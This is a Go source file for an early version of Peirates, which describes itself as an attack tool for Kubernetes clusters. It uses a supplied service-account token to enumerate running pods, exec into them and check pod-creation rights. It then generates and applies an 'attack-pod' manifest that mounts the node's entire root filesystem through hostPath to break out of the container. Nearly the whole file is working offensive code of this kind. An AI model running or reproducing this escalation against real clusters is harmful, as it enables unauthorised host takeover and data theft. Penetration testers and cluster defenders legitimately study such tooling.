// Peirates - an Attack tool for Kubernetes clusters
//
// You need to use "package main" for executables
//
// BTW always run `go fmt` before you check in code. go fmt is law.
//
package main

// Imports. If you don't use an import that's an error so
// I haven't imported json yet.
// Also, number one rule of Go: Try to stick to the
// standard library as much as possible
import (
	"flag"      // Command line flag parsing
	"fmt"       // String formatting (Printf, Sprintf)
	"io/ioutil" // Utils for dealing with IO streams
	"log"       // Logging utils
	"net/http"  // HTTP client/server
	"os/exec"
	"regexp"
	"strings"
	"math/rand" // Random module for creating random string building
	"time" // Time modules

	// Packages belonging to Peirates go here
	"gitlab.inguardians.com/agents/peirates/config"
)

// Struct type definition to contain our options. This is
// different from the original python code that had each
// of the options as top-level variables
// type ServerInfo struct {
// 	RIPAddress string
// 	RPort      string
// 	Token      string //pass token  via command line
// 	CAPath     string //path to ca certificate
// 	Namespace  string // namespace that this pod's service account is tied to
// }

// Function to parse options. We call it in main()
func parseOptions(connectionString *config.ServerInfo) {
	// This is like the parser.add_option stuff except
	// it works implicitly on a global parser instance.
	// Notice the use of pointers (&connectionString.RIPAddress for
	// example) to bind flags to variables
	flag.StringVar(&connectionString.RIPAddress, "i", "10.23.58.40", "Remote IP address: ex. 10.22.34.67")
	flag.StringVar(&connectionString.RPort, "p", "6443", "Remote Port: ex 10255, 10250")
	// flag.BoolVar(&connectionString.infoPods, "e", false, "Export pod information from remote Kubernetes server via curl")
	println("FIXME: parseOptions clobbers config.Builder()")
	// flag.StringVar(&connectionString.Token, "t", "", "Token to be used for accessing Kubernetes server")
	// flag.StringVar(&connectionString.CAPath, "c", "", "Path to CA certificate")

	// This is the function that actually runs the parser
	// once you've defined all your options.
	flag.Parse()

	// If the IP or Port are their empty string, we want
	// to just print out usage and crash because they have
	// to be defined
	if connectionString.RIPAddress == "" {
		// flag.Usage() prints out an auto-generated usage string.
		flag.Usage()
		// log.Fatal prints a message to stderr and crashes the program.
		log.Fatal("Error: must provide remote IP address (-i)")
	}
	if connectionString.RPort == "" {
		// Same as before
		flag.Usage()
		log.Fatal("Error: must provide remote Port (-p)")
	}
}

// get_pod_list() returns an array of pod names, parsed from kubectl get pods
func get_pod_list(connectionString config.ServerInfo) []string {

	var pods []string

	get_pods_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "get", "pods").Output()
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get pods, stripping off the first line which matches NAME and then grabbing the first column

	get_pods_lines := strings.Split(string(get_pods_raw), "\n")
	for _, line := range get_pods_lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to only enumerate running pods
			if strings.Fields(line)[2] == "Running" {
				pod := strings.Fields(line)[0]
				if pod != "NAME" {
					pods = append(pods, pod)
				}
			}
		}
	}

	return pods
}

// getHostname() runs kubectl with connection string to get hostname from pod
func getHostname(connectionString config.ServerInfo, PodName string) string {
	pod_hostname, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "exec", "-it", PodName, "hostname").Output()
	if err != nil {
		fmt.Println("Checking for hostname of pod "+PodName+" failed: ", err)
		return "- Hostname failed"
	} else {
		return "+ Hostname is " + string(pod_hostname)
	}
}

// canCreatePods() runs kubectl to check if current token can create a pod
func canCreatePods(connectionString config.ServerInfo) bool {
	can_I_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "auth", "can-i", "create", "pod").Output()
	if err != nil {
		return false
	} else {
		if strings.Contains(string(can_I_raw), "yes") {
			return true
		} else {
			return false
		}
	}

}

// inAPod() runs mount on the local system and then checks if output contains kubernetes
func inAPod(connectionString config.ServerInfo) bool {
	mount_output_bs, err := exec.Command("mount").Output()
	if err != nil {
		fmt.Println("Checking if we are running in a Pod failed: ", err)
		return false
	} else {
		mount_output := string(mount_output_bs)
		return strings.Contains(mount_output, "kubernetes")
	}

}

// Here's the requestme equivalent.
func requestme(connectionString config.ServerInfo, location string) {
	// Make a request, getting a response and possibly an error.
	// fmt.Sprintf is a function which acts like printf() except it returns a string.
	res, err := http.Get(fmt.Sprintf("http://%s:%s/%s", connectionString.RIPAddress, connectionString.RPort, location))

	// These three lines are a common idiom when you just want to crash if an error happens.
	if err != nil {
		// Remember, log.Fatal() prints to stderr and then crashes.
		log.Fatal(err)
	}

	// Read the entire response into memory.
	contents, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}

	// "contents" is a byte slice ([]byte). We use
	// string() to convert it to a string type.
	// The difference is that the string type is for
	// UTF-8 strings specifically, while the byte slice
	// type is for any sort of binary data. However, in
	// this case, we know the server is returning back
	// text data. If we did not convert it, println()
	// would print the pointer of the byte slice instead
	// of the actual string
	println(string(contents))
}


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Added mountFS code to create yaml file drop to disk and create a pod.    |
//--------------------------------------------------------------------------| 

func init() {
	rand.Seed(time.Now().UnixNano())
}

//var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

type Mount_Info struct {
	yaml_build  string
	image string
	namespace string
}

func Mount_RootFS(all_pods_listme []string, connectionString config.ServerInfo){
	var Mount_InfoVars = Mount_Info{}
	fmt.Println("This is the output: ", string(all_pods_listme[1]))
	//Get pods
//# Get the first pod from all_pod_listme
//pod_to_examine = all_pod_listme[0]

//# Run a kubectl command to get YAML
//yaml_output = kubectl -n ...  --token .... --ca ... get pod $pod_to_examine -o yaml

//# Parse yaml output to get the image name
//image_name = `grep "- image" yaml_output | awk '{print $3}'`

	get_images_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "get", "pods", all_pods_listme[0], "-o", "yaml",).Output()

	get_image_lines := strings.Split(string(get_images_raw), "\n")

	for _, line := range get_image_lines {
		matched, err := regexp.MatchString(`^\s*- image`, line)
		if err != nil {
			log.Fatal(err)
		}
		if matched {
			//added checking to only enumerate running pods
			Mount_InfoVars.image = strings.Fields(line)[2]
		}
	}

	if err != nil {
		log.Fatal(err)
	}

	//creat random  string
	random_string :=randSeq(1)

	// Create Yaml File
	Mount_InfoVars.yaml_build = fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  annotations:
  labels:
  name: attack-pod-%s
  namespace: %s
spec:
  containers:
  - image: %s
    imagePullPolicy: IfNotPresent
    name: attack-container
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
`, random_string, connectionString.Namespace, Mount_InfoVars.image)

// Write yaml file out to current directory
	ioutil.WriteFile("attack-pod.yaml", []byte(Mount_InfoVars.yaml_build), 0700)

	_, err = exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "apply", "-f","attack-pod.yaml").Output()
	if err != nil {
		log.Fatal(err)
	}

	//out, err = exec.Command("").Output()
	//if err != nil {
	//	fmt.Println("Token location error: ", err)
	//}
	//fmt.Println(out)
}


//------------------------------------------------------------------------------------------------------------------------------------------------







func main() {

	// Create a global variable named "connectionString" initialized to
	// default values
	var connectionString config.ServerInfo = config.Builder()

	// Run the option parser to initialize connectionStrings
	println("\n\nStarting periates...")
	parseOptions(&connectionString)

	if inAPod(connectionString) {
		println("+ You are in a pod.")
	} else {
		println("- You are not in a Kubernetes pod.")
	}

	all_pods := get_pod_list(connectionString)

	for _, pod := range all_pods {
		println("Checking out pod: " + pod)
		println(getHostname(connectionString, pod))
	}

	pod_creation := canCreatePods(connectionString)
	if pod_creation {
		println("- This token can create pods on the cluster")
	} else {
		println(" This token cannot create pods on the cluster")
	}

	Mount_RootFS(all_pods, connectionString)

	// This part is direct conversion from the python
	// Note that we use println() instead of print().
	// In go, print() does not add a newline while
	// println() does.
	/*	if connectionString.infoPods {
			requestme("pods")
			println("---------------------------")
			println("Extracting Pods via Curl  | ")
			println("--------------------------------------------------------------------------------------->")
			requestme("pods")
			println("--------------------------------------------------------------------------------------->")
			requestme("stats")
			requestme("stats/summary")
			requestme("stats/container")
			requestme("metrics")
			requestme("healthz")
		}
	*/
}

// Example of a multi-line comment
/*
https://10.23.58.40:6443/api
https://10.23.58.40:6443/api/v1
https://10.23.58.40:6443/apis
https://10.23.58.40:6443/apis/apps
https://10.23.58.40:6443/apis/batch
https://10.23.58.40:6443/apis/extentions
https://10.23.58.40:6443/apis/policy
https://10.23.58.40:6443/version
https://10.23.58.40:6443/apis/apps/v1/proxy (500)
https://10.23.58.40:6443/apis/apps/v1/watch (500)
*/

